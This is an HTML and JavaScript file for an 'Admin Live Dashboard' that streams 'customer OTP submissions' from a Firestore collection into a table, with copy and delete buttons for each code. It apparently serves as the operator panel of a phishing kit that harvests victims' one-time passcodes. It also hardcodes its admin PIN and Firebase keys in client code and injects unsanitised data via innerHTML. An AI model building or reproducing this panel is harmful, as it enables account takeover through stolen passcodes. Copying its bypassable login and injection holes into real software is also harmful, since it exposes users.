<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AMAR Social Hub - Admin Live Dashboard</title>
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #090d16;
            color: #e2e8f0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        .glass-card {
            background: rgba(15, 23, 42, 0.75);
            backdrop-filter: blur(16px);
            border: 1px solid rgba(255, 255, 255, 0.08);
        }
    </style>
</head>
<body class="min-h-screen p-4 md:p-8">

    <!-- PIN Authentication Layer -->
    <div id="loginOverlay" class="fixed inset-0 z-50 bg-black/90 backdrop-blur-md flex items-center justify-center p-4">
        <div class="glass-card max-w-sm w-full p-6 rounded-2xl text-center space-y-4">
            <div class="w-12 h-12 bg-cyan-500/10 text-cyan-400 rounded-full flex items-center justify-center mx-auto border border-cyan-500/30">
                <i class="fas fa-user-shield text-xl"></i>
            </div>
            <h2 class="text-xl font-bold text-white">Admin Authentication</h2>
            <p class="text-xs text-gray-400">Enter Admin Security PIN to access live OTP feed.</p>
            
            <input type="password" id="pinInput" maxlength="6" placeholder="Enter PIN (Default: 778899)"
                class="w-full bg-gray-900 border border-gray-700 rounded-xl px-4 py-3 text-center text-xl tracking-widest text-cyan-300 outline-none focus:border-cyan-500">
            
            <div id="loginError" class="hidden text-xs text-red-400">Incorrect Passcode!</div>
            
            <button id="loginBtn" class="w-full bg-cyan-500 hover:bg-cyan-400 text-gray-950 font-bold py-3 rounded-xl transition">
                Unlock Dashboard
            </button>
        </div>
    </div>

    <!-- Admin Dashboard Main Screen -->
    <div class="max-w-6xl mx-auto space-y-6">
        <!-- Header -->
        <div class="flex flex-col md:flex-row justify-between items-start md:items-center gap-4 glass-card p-6 rounded-2xl">
            <div>
                <h1 class="text-2xl font-extrabold text-white flex items-center gap-2">
                    <i class="fas fa-bolt text-cyan-400"></i> Live OTP Dashboard
                </h1>
                <p class="text-xs text-gray-400 mt-1">Real-time incoming customer OTP submission stream</p>
            </div>
            <div class="flex items-center gap-3">
                <span class="inline-flex items-center px-3 py-1 bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs rounded-full">
                    <span class="w-2 h-2 bg-emerald-400 rounded-full animate-ping mr-2"></span> Realtime Active
                </span>
                <button id="clearAllBtn" class="px-3 py-1.5 bg-red-500/10 border border-red-500/30 text-red-400 hover:bg-red-500/20 text-xs rounded-lg transition">
                    <i class="fas fa-trash-alt mr-1"></i> Clear Feed
                </button>
            </div>
        </div>

        <!-- Live Feed Container -->
        <div class="glass-card rounded-2xl p-6">
            <div class="flex justify-between items-center mb-4">
                <h2 class="text-lg font-bold text-white">Submitted Codes</h2>
                <span id="totalCount" class="text-xs text-cyan-400 font-mono">0 Total Codes</span>
            </div>

            <div class="overflow-x-auto">
                <table class="w-full text-left text-sm">
                    <thead class="text-xs text-gray-400 uppercase bg-gray-900/50 border-b border-gray-800">
                        <tr>
                            <th class="p-3">OTP Code</th>
                            <th class="p-3">Type</th>
                            <th class="p-3">Session ID</th>
                            <th class="p-3">Time</th>
                            <th class="p-3 text-right">Actions</th>
                        </tr>
                    </thead>
                    <tbody id="otpTableBody" class="divide-y divide-gray-800">
                        <tr>
                            <td colspan="5" class="p-6 text-center text-gray-500 text-xs">
                                Listening for live submissions...
                            </td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </div>
    </div>

    <!-- Firebase SDKs -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>

    <script>
        // Admin Security PIN
        const ADMIN_PIN = "778899";

        // Firebase Config
        const firebaseConfig = {
            apiKey: "AIzaSyCrrUQLMes8TcRXbEk1I1a8D6vnhAFaLNvI",
            authDomain: "amar-d755e.firebaseapp.com",
            projectId: "amar-d755e",
            storageBucket: "amar-d755e.firebasestorage.app",
            messagingSenderId: "761406989668",
            appId: "1:761406989668:web:d26bb2ee84ac257a150671"
        };

        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();

        // PIN Login logic
        const loginOverlay = document.getElementById('loginOverlay');
        const pinInput = document.getElementById('pinInput');
        const loginBtn = document.getElementById('loginBtn');
        const loginError = document.getElementById('loginError');

        loginBtn.addEventListener('click', () => {
            if (pinInput.value === ADMIN_PIN) {
                loginOverlay.classList.add('hidden');
                initRealtimeListener();
            } else {
                loginError.classList.remove('hidden');
            }
        });

        // Realtime Firestore Listener
        function initRealtimeListener() {
            db.collection('otps').orderBy('createdAt', 'desc').onSnapshot((snapshot) => {
                const tableBody = document.getElementById('otpTableBody');
                document.getElementById('totalCount').innerText = `${snapshot.docs.length} Total Codes`;

                if (snapshot.empty) {
                    tableBody.innerHTML = `<tr><td colspan="5" class="p-6 text-center text-gray-500 text-xs">No OTPs submitted yet.</td></tr>`;
                    return;
                }

                tableBody.innerHTML = '';
                snapshot.docs.forEach((doc) => {
                    const data = doc.data();
                    const docId = doc.id;
                    const timeStr = data.createdAt ? new Date(data.createdAt.toDate()).toLocaleTimeString() : 'Just now';

                    const row = document.createElement('tr');
                    row.className = "hover:bg-gray-800/30 transition";
                    row.innerHTML = `
                        <td class="p-3">
                            <span class="font-mono text-xl font-bold text-cyan-300 tracking-wider">${data.otp}</span>
                        </td>
                        <td class="p-3">
                            <span class="px-2 py-0.5 text-[10px] bg-blue-500/10 text-blue-400 border border-blue-500/30 rounded">
                                ${data.length || data.otp.length}-Digit
                            </span>
                        </td>
                        <td class="p-3 font-mono text-xs text-gray-400">${data.sessionId || 'N/A'}</td>
                        <td class="p-3 text-xs text-gray-500">${timeStr}</td>
                        <td class="p-3 text-right">
                            <button onclick="copyOtp('${data.otp}')" class="px-2.5 py-1 bg-gray-800 hover:bg-gray-700 text-xs text-gray-300 rounded mr-1">
                                <i class="fas fa-copy"></i>
                            </button>
                            <button onclick="deleteOtp('${docId}')" class="px-2.5 py-1 bg-red-500/10 hover:bg-red-500/20 text-xs text-red-400 rounded">
                                <i class="fas fa-trash"></i>
                            </button>
                        </td>
                    `;
                    tableBody.appendChild(row);
                });
            }, (error) => {
                console.error("Firestore Error:", error);
                alert("Database Error: Check your Firestore Security Rules!");
            });
        }

        function copyOtp(code) {
            navigator.clipboard.writeText(code);
            alert("OTP Code Copied: " + code);
        }

        async function deleteOtp(id) {
            if (confirm("Delete this entry?")) {
                await db.collection('otps').doc(id).delete();
            }
        }
    </script>
</body>
</html>
